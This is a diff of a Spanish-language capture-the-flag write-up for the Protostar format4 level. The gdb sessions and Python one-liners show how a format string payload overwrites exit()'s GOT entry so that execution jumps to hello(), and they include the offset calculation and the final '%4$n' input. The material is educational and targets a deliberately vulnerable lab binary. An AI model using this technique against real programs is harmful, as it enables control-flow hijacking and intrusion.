@@ -304,7 +304,8 @@ Solo que hay una función llamada "hello"
 Abrimos el programa con gdb y le echamos un vistazo.
 Adelanto que aquí entra en juego el concepto de la [GOT](https://github.com/CUCUxii/CUCUxii.github.io/blob/main/binarios/Estructura%20de%20un%20binario.md) Tenemos que poner la direccion de la función "hello()" en la tabla GOT (por tanto el programa vera que hay algo ahi y no llamará al loader, este no buscará la direccion buena de exit())
 
-Cuando se examina un binario sin haber hecho ningun breakpoint (o sea no esta en ejecucion) nos sale las entradas de la GOT, (no la llamada a ld.so)
+
+## Expotación en gdb: 
 
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ gdb ./format4 
@@ -315,43 +316,25 @@ Instrucciones de main entre ellas, saltar a vuln()
 (gdb) disas vuln
 ...
 0x0804850f <vuln+61>:	call   0x80483ec <exit@plt> -> Entrada en la tabla plt de exit()
-(gdb) x/i 0x80483ec       -> Nos interesa ver la primera instruccion de plt (la que tiene relacion con la GOT, no las del ld.so)
-0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724 -> Llamada a la GOT de exit()
-(gdb) x 0x8049724
-0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	repnz add DWORD PTR [eax+ecx*1],0x0 -> Código de exit()
-```
-Yatenemos todas las direcciones que nos interesan, la de la funcion hello() y la de la llamada a GOT original (printf). Hay que sustituirla por la
-de hello(). En gdb es muy fácil
-
-## Expotación en gdb: 
-
-```console
 (gdb) b *0x0804850f 
 (gdb) r
 Starting program: /opt/protostar/bin/format4 
 AAAA
 AAAA
 Breakpoint 1, 0x0804850f in vuln () at format4/format4.c:22
-(gdb) set {int}0x8049724=0x080484b4
+(gdb) x/i 0x80483ec       -> Nos interesa ver la primera instruccion de plt (la que tiene relacion con la GOT, no las del ld.so)
+0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724 -> Llamada buscar la direccion de la tabla GOT
+(gdb) x 0x8049724
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	repnz add DWORD PTR [eax+ecx*1],0x0 
+(gdb) set {int}0x8049724=0x080484b4 -> en esta memoria que es donde se mete la direccion de la funcion a jeecutar, metemos la de hello.
 (gdb) c
 Continuing.
 code execution redirected! you win
 Program exited with code 01.
 ```
-## Diseaccionado en gdb:
+## Explotación manual:
 
-Hay que explotarlo con el format string. Ya adelanto que es el 4º argumento.
-> **%4$x"\*4** Escribir a partir del cuarto elemento (pero no en la memoria de ningun puntero de la pila como con %n sino en la pila en sí)
-
-```console
-[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("AAAA" + "%x."*4)' | ./format4
-AAAA200.b7fd8420.bffff524.41414141
-[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08" + "%4$n")' | ./format4
-Segmentation fault
-[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08" + "%4$n")' > /tmp/pattern
-```
-Como nos sale SEGFAULT todo el rato, lo metemos en un archivo (/tmp/pattern) y abrimos el binario con gdb
-Sabemos de antes que el resultado de la GOT original de exit() es "0x8049724" pero tiene que ser hello() "0x080484b4"
+Vamos a explotarla de una manera muy similar a format3, pero en vez de sobreescribir en la direccion de una varaible (puntero de varaible), hay que hacerlo con la de una funcion (puntero de función)
 
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ gdb ./format4
@@ -362,34 +345,34 @@ Sabemos de antes que el resultado de la GOT original de exit() es "0x8049724" pe
 0x08048508 <vuln+54>:	mov    DWORD PTR [esp],0x1
 0x0804850f <vuln+61>:	call   0x80483ec <exit@plt>
 (gdb) break * 0x08048503 -> Antes de que modifique el GOT por meter los comandos de la pila 
-(gdb) break * 0x0804850f -> Instruccion de exit
-(gdb) run < /tmp/pattern
-Breakpoint 1 alcanzado!
+(gdb) run
 (gdb) x/i 0x80483ec
 0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724  -> Saltamos a la GOT...
 (gdb) x/x 0x8049724 -> Insutruciion de GOT, alberga la direccion de nuestra funcion (o sea es un puntero de funcion)
-0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483f2 -> El valor original que tendría la GOT (saltar al dl.so para buscar la direccion...)
-(gdb) x/2i 0x080483f2 
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483f2 
+(gdb) x/2i 0x080483f2 -> No se ha ejecutado todavia, por eso salen las insutrcciones que llaman al ld.so.
 0x80483f2 <exit@plt+6>:	push   0x30
 0x80483f7 <exit@plt+11>:	jmp    0x804837c
-(gdb) c
-Continuing.
-(gdb) x/x 0x8049724 -> Pero ahora en vez de eso tenemos que en la GOT hemos escrito "0x4"
-0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x00000004
 ```
 
-## Expotación manual: 
-Vamos a explotarla de una manera muy similar a format3, pero en vez de sobreescribir en la direccion de una varaible (puntero de varaible), hay que hacerlo con la de una funcion (puntero de función)
+Por tanto la memoria 0x8049724 tiene que tener la direccion de hello() 
+
+Vamos a calcular el offset primero
+
 ```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("AAAA" + "%x."*4)' | ./format4
+AAAA200.b7fd8420.bffff524.41414141
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08" + "%4$n")' | ./format4
+Segmentation fault
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08" + "%4$n")' > /tmp/pattern
 [user@protostar]-[/opt/protostar/bin]:$ gdb ./format4
-(gdb) break * 0x0804850f
+(gdb) break * 0x0804850f -> Direccion de exit() para que nos muestre como hemos sobreescrito la direccion de la tabla GOT.
 (gdb) run < /tmp/pattern
 (gdb) x/x 0x8049724
-0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x00000004
-(gdb) p &hello
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x00000004 -> Este es el valor que nos sale.
+(gdb) p &hello -> Sacar la direccion de hello
 $1 = (void (*)(void)) 0x80484b4 <hello>
-(gdb) p 0x80484b4 - 0x00000004
+(gdb) p 0x80484b4 - 0x00000004 -> Restar la direccion de hello con el valor que nos sale en GOT para ver cuanto hay que aumentarlo
 $2 = 134513840
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08" + "%134513840x%4$n")' | ./format4
 Se ha tirado un buen rato escribiendo lineas vacias en la pantalla, pero al fin...     
